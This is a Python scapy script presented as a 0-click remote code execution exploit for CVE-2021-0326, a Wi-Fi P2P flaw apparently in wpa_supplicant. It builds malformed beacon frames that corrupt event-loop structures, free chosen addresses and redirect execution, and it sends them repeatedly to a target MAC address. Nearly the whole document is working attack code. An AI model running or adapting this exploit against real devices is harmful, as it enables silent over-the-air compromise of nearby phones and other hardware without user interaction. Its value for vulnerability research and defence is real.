from scapy.all import *
import argparse

desc = """
Skeleton32 (but pronounced like Peloton32):
A 0-click RCE exploit for 32 bit CVE-2021-0326

Austin Emmitt of Nowsecure (@alkalinesec)
"""

parser = argparse.ArgumentParser(description=desc,
    formatter_class=argparse.RawTextHelpFormatter)

parser.add_argument('-i', dest='interface', required=True,
    help='network interface in monitor mode')
parser.add_argument('-t', dest='target', required=True, 
    help='target MAC address')
args = parser.parse_args()

iface = args.interface        # interface in monitor mode
target = args.target          # target MAC address

base  = 0x2a000000            # base address of main module
eloop = 0xb6919420            # eloop_timeout address
p2    = 0xb69202e0            # second part of payload

eloop_next = base + 0x12b670  # eloop next (&list terminates)
wpa_printf = base + 0xf391    # addr of wpa_printf

msg = b"hi!"                  # log on success (< 4 bytes)
frees = [eloop-0x10]          # list of addrs to free (up to 10)
sec_devs = 0x11+len(frees)    # number of secondary device types

p32 = lambda x: struct.pack("<I", x)

def build_beacon(dev_mac, client_mac):
    group = (
        client_mac + b"CCCCCC\xffDDEEEEEEEE" +  # p2p client information
        struct.pack("<B", sec_devs) +           # secondary dev count
        b"\x00"*(sec_devs*8-4*len(frees)) +     # nulls to fill up sec devs
        b"".join(p32(x) for x in frees) +       # addresses to be freed
        b"\x10\x11\x00\x00")                    # empty device name 

    group = struct.pack("<B", len(group)) + group # p2p group info 
    p2p = Dot11EltVendorSpecific(oui=0x506f9a, info=(
        b"\x09\x03\x06\x00" + dev_mac +          # p2p device id, group info
        b"\x0e" +                                # p2p group info identifier
        struct.pack("<H", len(group)) + group))  # len of group info 

    ext_data1 = (
        p32(p2) +          # next: address of ext_data2
        p32(eloop_next) +  # previous: address of terminator
        b"\x00"*8)        # times filled with 00 so it doesnt reorder

    vendor1 = Dot11EltVendorSpecific(oui=0x0050f2, info=(
        b"\x04\x10\x49" +                    # vendor extension id
        struct.pack(">H", len(ext_data1)) +  # length of 1st payload
        ext_data1))                          # 1st payload data

    ext_data2 = (
        p32(eloop_next) +            # next: address of terminator
        p32(eloop) +                 # previous: address of ext_data1
        p32(0) + p32(0) +            # times set to 0 so it runs right away
        p32(5) + p32(p2+0x1c) +      # error level, address of msg 
        p32(wpa_printf) +            # addr of wpa_printf to jump to 
        msg + b"\x00"*(4-len(msg)))  # message and null padding

    vendor2 = Dot11EltVendorSpecific(oui=0x0050f2, info=(
        b"\x04\x10\x49" +                    # vendor extension id
        struct.pack(">H", len(ext_data2)) +  # length of 2nd payload
        ext_data2))                          # 2nd payload data

    mac = RandMAC() # (fake) mac address of source 
    dot11 = Dot11FCS(addr1=target, addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info='DIRECT-XX') 
    rates = Dot11Elt(ID='Rates', info=b"\x48")    
    rsn = Dot11Elt(ID='RSNinfo', info=(
        b"\x01\x00"          # RSN Version 1
        b"\x00\x0f\xac\x02"  # Group Cipher Suite : 00-0f-ac TKIP
        b"\x02\x00"          # 2 Pairwise Cipher Suites 
        b"\x00\x0f\xac\x04"  # AES Cipher
        b"\x00\x0f\xac\x02"  # TKIP Cipher
        b"\x01\x00"          # 1 Authentication Key Managment Suite 
        b"\x00\x0f\xac\x02"  # Pre-Shared Key
        b"\x00\x00"))        # RSN Capabilities 

    # assemble packet
    packet = RadioTap()/dot11/beacon/essid/rates/rsn/p2p

    # add fake eloop_timeout elements
    for vendor in (vendor1, vendor2):
        for i in range(5):
            packet = packet / vendor

    return packet 

mac1 = b"AAAAAA"  # first dev MAC
mac2 = b"BBBBBB"  # first client MAC

# two packets with swapped addresses 
# to free at least ones vendor_ext
packet1 = build_beacon(mac1, mac2)
packet2 = build_beacon(mac2, mac1)

print("sending exploit to %s" % target)
sendp([packet1, packet2], iface=iface, inter=0.100, loop=1)
